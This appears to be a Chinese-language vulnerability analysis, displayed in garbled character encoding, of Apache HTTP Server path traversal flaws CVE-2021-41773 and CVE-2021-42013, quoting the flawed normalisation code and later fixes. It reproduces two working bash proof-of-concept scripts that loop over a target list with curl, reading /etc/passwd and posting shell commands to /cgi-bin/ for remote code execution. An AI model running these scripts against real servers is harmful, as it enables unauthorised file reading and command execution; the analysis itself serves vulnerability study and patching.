### æç¤º



æ–‡ç« é¦–å‘äº[FreeBuf](https://www.freebuf.com/vuls/311433.html)



### æ¼æ´è¯´æ˜

åœ¨Apache HTTP Server 2.4.49 ä¸­å¯¹è·¯å¾„è§„èŒƒåŒ–æ‰€åšçš„æ›´æ”¹ä¸­å‘ç°äº†ä¸€ä¸ªç¼ºé™·ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨è·¯å¾„éå†æ”»å‡»ç©¿è¶Šåˆ°æœåŠ¡å™¨ç›®å½•ä»¥å¤–ã€‚åœ¨å¼€å¯CGIé…ç½®å(å¼€å¯cgiå¹¶ä¸æ˜¯ä»€ä¹ˆç½•è§ä¹‹äº‹)ï¼Œå°†ä¼šä»ç›®å½•ç©¿è¶Šå‡çº§ä¸ºRCEã€‚



### æ¼æ´å½±å“

== Apache HTTP Server  2.4.49

== Apache HTTP Server 2.4.50 ï¼ˆä¿®å¤ä¸å®Œæ•´ CVE-2021-42013ï¼‰



### æ¼æ´æˆå› 

1. ç”±äºåœ¨Apache HTTP Server 2.4.48 å‡çº§åˆ° Apache HTTP Server 2.4.49 æ—¶ï¼Œå¯¹è·¯å¾„è§„èŒƒåŒ–æ‰€åšçš„æ›´æ”¹ä¸­å‡ºç°æ¼æ´ï¼Œè¯¥æ¼æ´æ˜¯ç”±äº ***server/util.c*** ä¸­çš„ ***ap_normalize_path*** å‡½æ•° ä¸€æ¬¡è§£æä¸€ä¸ª Unicode å€¼å¹¶åœ¨æ‰€æœ‰å­—ç¬¦éƒ½è¢«è§£ç ä¹‹å‰å°è¯•æ£€æµ‹éå†é€»è¾‘å¯¼è‡´çš„ã€‚

2. è¯¥æ¼æ´é»˜è®¤é…ç½®æƒ…å†µä¸‹åªå­˜åœ¨ç›®å½•éå†ï¼Œä½†å¼€å¯ä¸å—é™åˆ¶çš„ ***mod_cgi*** åŠŸèƒ½å°†ä¼šé€ æˆRCE



### æ¼æ´ä»£ç å—

å­˜åœ¨æ¼æ´çš„ä»£ç å—

```c
# server/util.c ç¬¬ 561 â€“ 596 è¡Œ

if (path[l] == '.') {
    /* Remove /./ segments */
    if (IS_SLASH_OR_NUL(path[l + 1])) {
        l++;
        if (path[l]) {
            l++;
        }
        continue;
    }

    /* Remove /xx/../ segments */
    if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) {
        /* Wind w back to remove the previous segment */
        if (w > 1) {
            do {
                w--;
            } while (w && !IS_SLASH(path[w - 1]));
        }
        else {
            /* Already at root, ignore and return a failure
             * if asked to.
             */
            if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) {
                ret = 0;
            }
        }

        /* Move l forward to the next segment */
        l += 2;
        if (path[l]) {
            l++;
        }
        continue;
    }
}

```



ä¸ä¸Šä¸€ä¸ªä»£ç å—åšå¯¹æ¯”

![image-20211130172432036](../assets/2021-11-30-CVE--2021--41773%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20211130172432036.png)



å®Œæ•´å†…å®¹

```c
AP_DECLARE(int) ap_normalize_path(char *path, unsigned int flags)
{
    int ret = 1;
    apr_size_t l = 1, w = 1;

    if (!IS_SLASH(path[0])) {
        /* Besides "OPTIONS *", a request-target should start with '/'
         * per RFC 7230 section 5.3, so anything else is invalid.
         */
        if (path[0] == '*' && path[1] == '\0') {
            return 1;
        }
        /* However, AP_NORMALIZE_ALLOW_RELATIVE can be used to bypass
         * this restriction (e.g. for subrequest file lookups).
         */
        if (!(flags & AP_NORMALIZE_ALLOW_RELATIVE) || path[0] == '\0') {
            return 0;
        }

        l = w = 0;
    }

    while (path[l] != '\0') {
        /* RFC-3986 section 2.3:
         *  For consistency, percent-encoded octets in the ranges of
         *  ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D),
         *  period (%2E), underscore (%5F), or tilde (%7E) should [...]
         *  be decoded to their corresponding unreserved characters by
         *  URI normalizers.
         */
        if ((flags & AP_NORMALIZE_DECODE_UNRESERVED)
                && path[l] == '%' && apr_isxdigit(path[l + 1])
                                  && apr_isxdigit(path[l + 2])) {
            const char c = x2c(&path[l + 1]);
            if (apr_isalnum(c) || (c && strchr("-._~", c))) {
                /* Replace last char and fall through as the current
                 * read position */
                l += 2;
                path[l] = c;
            }
        }

        if ((flags & AP_NORMALIZE_DROP_PARAMETERS) && path[l] == ';') {
            do {
                l++;
            } while (!IS_SLASH_OR_NUL(path[l]));
            continue;
        }

        if (w == 0 || IS_SLASH(path[w - 1])) {
            /* Collapse ///// sequences to / */
            if ((flags & AP_NORMALIZE_MERGE_SLASHES) && IS_SLASH(path[l])) {
                do {
                    l++;
                } while (IS_SLASH(path[l]));
                continue;
            }


            if (path[l] == '.') {
                /* Remove /./ segments */
                if (IS_SLASH_OR_NUL(path[l + 1])) {
                    l++;
                    if (path[l]) {
                        l++;
                    }
                    continue;
                }

                /* Remove /xx/../ segments */
                if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) {
                    /* Wind w back to remove the previous segment */
                    if (w > 1) {
                        do {
                            w--;
                        } while (w && !IS_SLASH(path[w - 1]));
                    }
                    else {
                        /* Already at root, ignore and return a failure
                         * if asked to.
                         */
                        if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) {
                            ret = 0;
                        }
                    }

                    /* Move l forward to the next segment */
                    l += 2;
                    if (path[l]) {
                        l++;
                    }
                    continue;
                }
            }
        }

        path[w++] = path[l++];
    }
    path[w] = '\0';

    return ret;
}
```





### åˆ†æ

å½“æ”»å‡»è€…åœ¨ URL ä¸­ä½¿ç”¨ ***/.%2e/*** æ—¶ï¼Œç¬¬ 572 è¡Œçš„é€»è¾‘ä¸ä¼šå°† ***%2e*** è¯†åˆ«ä¸ºå¥å·ï¼Œæ­¤æ—¶è¯¥å­—ç¬¦å°šæœªè¢«è§£ç ã€‚ä½†è¯¥ç‰ˆæœ¬Apache HTTP Serverså¹¶æ²¡æœ‰åœ¨è¿™ç§æƒ…å†µä¸‹å°†æ•´ä½“URLè¿›è¡Œè§£ç å¹¶åŒ¹é…ç›®å½•ç©¿è¶Šè¿‡æ»¤ï¼Œå¯¼è‡´ **/.%2e/** è¢« ç›´æ¥ä»£å…¥ä¼ é€’ï¼Œå¯¼è‡´ç›®å½•ç©¿è¶Šï¼Œå…·ä½“å¦‚ä¸‹ğŸ‘‡



```c
/* Remove /xx/../ segments */
                if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2]))
#ä¸Šé¢çš„ä»£ç é”™è¯¯åˆ¤æ–­äº†ç›®å½•ç©¿è¶Šçš„payloadï¼Œ&& åˆ¤æ–­åªæœ‰åœ¨ç›®å½•.çš„åé¢è·Ÿçš„æ˜¯/æˆ–è€…ç©ºçš„æ—¶å€™æ‰ä¼šè§¦å‘æ¬¡è§„åˆ™ï¼Œå¹¶ä¸”æ²¡æœ‰è§£URLç¼–ç çš„%2eä¼ å…¥åå¹¶ä¸ä¼šå¯¹%2eè§£ç è¿›è¡Œå›æº¯éªŒè¯ï¼Œä¹Ÿä¸ä¼šå¯¹æ•´ä½“URLè¿›è¡Œè§£ç åŒ¹é…ï¼Œè€Œæ˜¯åªè¯†åˆ«äº†%,2,e                    

                    
#define IS_SLASH(s) (s == '/')
#define IS_SLASH_OR_NUL(s) (s == '\0' || IS_SLASH(s))
```



ç„¶è€Œè¯¥æ¼æ´å¹¶ä¸æ˜¯æ‰€æœ‰æƒ…å†µä¸‹éƒ½èƒ½å¤ŸRCE:

å¯¼è‡´è¯¥æ¼æ´ä» ç›®å½•ç©¿è¶Š / æ•æ„Ÿæ–‡ä»¶æ³„éœ² å‡çº§åˆ°RCEçš„å…³é”®æ˜¯ ***å¼€å¯äº†cgié…ç½®***

è‡³äºä»€ä¹ˆæ˜¯CGIï¼Œäº’è”ç½‘ä¸Šçš„æ•™ç¨‹å¾ˆå¤šï¼Œè¿™é‡Œå°±ä¸åœ¨èµ˜è¿°

åœ¨ä¸€äº›CGIé…ç½®æ–‡ä»¶é™åˆ¶æ‰©å±•åä¸å…¨çš„æƒ…å†µä¸‹ï¼Œåœ¨ **/cgi-bin/** ç›®å½•ä¸‹æ‰§è¡Œçš„æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«å½“ä½œcgiè„šæœ¬ç¨‹åºæ‰§è¡Œ

æ‰€ä»¥å‡ºç°äº†ä»¥ä¸‹pocï¼š

```
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 =3D=3D '' ]]; [[ $2 =3D=3D '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami
```



### åç»­

åœ¨2.4.49 -> 2.4.50ç‰ˆæœ¬ä¸­ä»£ç å˜æ›´å†…å®¹å¦‚ä¸‹:

![image-20211215004455348](../assets/2021-11-30-CVE--2021--41773%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20211215004455348.png)

å‘ç°å¤šäº†ä¸€ä¸ªå…³é”®å­— **decode_unreserved** ï¼Œæ‰¾ä¸€ä¸‹ï¼Œå‘ç°äº†533-541è¡Œ

è¯¥å¤„ä»£ç æ£€æŸ¥äº†ä»¥%å¼€å¤´ï¼Œåä¸¤ä½è§£ç åä¸º **-._~** å­—ç¬¦çš„å†…å®¹ï¼Œä½†ä¾æ—§æ²¡æœ‰å¯¹æ•´ä½“å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œä¹Ÿæ²¡æœ‰é˜²æ­¢äºŒæ¬¡ç¼–ç 

```c
        if (decode_unreserved
                && path[l] == '%' && apr_isxdigit(path[l + 1])
                                  && apr_isxdigit(path[l + 2])) {
            const char c = x2c(&path[l + 1]);
            if (apr_isalnum(c) || (c && strchr("-._~", c))) {
                /* Replace last char and fall through as the current
                 * read position */
                l += 2;
                path[l] = c;
```

å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¯¥ç‰ˆæœ¬çš„ä»£ç ç‰¹åˆ«çš„é’ˆå¯¹äº†%2e

```c
  /* Remove /xx/../ segments (or /xx/.%2e/ when
                 * AP_NORMALIZE_DECODE_UNRESERVED is set since we
                 * decoded only the first dot above).
                 */
                n = l + 1;
                if ((path[n] == '.' || (decode_unreserved
                                        && path[n] == '%'
                                        && path[++n] == '2'
                                        && (path[++n] == 'e'
                                            || path[n] == 'E')))
                    && IS_SLASH_OR_NUL(path[n + 1])) {
                    /* Wind w back to remove the previous segment */
```

ä½†æ˜¯ä»–ä»¬å¥½åƒå¿˜è®°äº†URLåŒé‡ç¼–ç ...

æ‰€ä»¥POC(CVE-2021-42013):

```
# Exploit: Apache HTTP Server 2.4.50 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.50
# Tested on: 2.4.50
# CVE : CVE-2021-42013
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
echo ./PoC.sh targets.txt /bin/sh id

exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami
```



åœ¨2.4.50 -> 2.4.51ç‰ˆæœ¬ä¸­ä»£ç å˜æ›´å†…å®¹å¦‚ä¸‹:

![image-20211215011406842](../assets/2021-11-30-CVE--2021--41773%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20211215011406842.png)

æˆåŠŸä¿®å¤äº†æ¼æ´



### é™„å½•

[Apache Http Server å†å²ç‰ˆæœ¬å½’æ¡£](https://archive.apache.org/dist/httpd/)
